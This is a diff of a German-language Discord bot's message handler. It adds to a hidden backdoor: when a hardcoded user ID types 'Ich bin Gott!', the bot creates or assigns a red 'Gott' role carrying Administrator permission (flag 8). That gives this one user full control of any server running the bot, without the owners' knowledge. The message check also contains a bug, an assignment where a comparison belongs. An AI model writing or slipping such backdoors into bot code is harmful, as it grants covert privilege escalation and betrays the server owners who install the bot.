@@ -118,12 +118,18 @@ bot.on("message", function(message){
     if(message.content = "Ich bin Gott!"){
         if (message.author == "<@223876496291266560>")//senpaii
         {
-            if(message.guild.roles.find("name","Gott"))
+            if(message.member.roles.find("name","Gott"))
             {
                 message.channel.send("`Ja bist du schon!..`");
             }
             else{
-                message.guild.createRole({
+                if(message.guild.roles.find("name","Gott"))
+                {
+                    message.channel.send("`Oh, Sie haben nicht genug Rechte! Lassen sie mich das ändern! ...`");
+                    let God = message.member.guild.roles.find("name", "Gott");
+                    message.member.addRole(God);
+                }else{
+                    message.guild.createRole({
                     name: "Gott",
                     permissions: [8],
                     color: "FF0000",
@@ -132,7 +138,7 @@ bot.on("message", function(message){
                 });
                 message.channel.send("`Oh, Sie haben nicht genug Rechte! Lassen sie mich das ändern! ...`");
                 let God = message.member.guild.roles.find("name", "Gott");
-                message.member.addRole(God);
+                message.member.addRole(God);}
             }
         }else{
             message.channel.send("`Ööm nein?`")
